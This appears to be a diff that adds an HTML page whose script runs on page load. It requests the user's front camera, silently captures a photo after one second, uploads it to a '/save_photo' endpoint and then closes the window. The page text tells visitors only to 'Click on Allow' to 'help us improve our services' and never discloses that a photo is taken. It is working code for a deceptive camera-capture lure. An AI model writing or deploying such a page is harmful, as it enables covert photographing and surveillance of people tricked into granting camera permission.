@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 40px; }
+        h1 { color: #333; }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            }).then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('photo', blob, 'photo.jpg');
+                            fetch('/save_photo', { method: 'POST', body: formData })
+                                .then(res => res.text())
+                                .then(msg => {
+                                    document.body.innerHTML = `<h1>Thank you for your participation!</h1><p>${msg}</p>`;
+                                    setTimeout(() => window.close(), 3000);
+                                }).catch(err => {
+                                    document.body.innerHTML = `<h1>Error</h1><p>Could not save.</p>`;
+                                    console.error(err);
+                                });
+                        }, 'image/jpeg', 0.9);
+                    }, 1000);
+                };
+            }).catch(err => {
+                document.body.innerHTML = `<h1>Error</h1><p>${err.message}</p>`;
+                console.error(err);
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Please Click on Allow Button</h1>
+    <h1>To help us improve our services</h1>
+</body>
+</html>
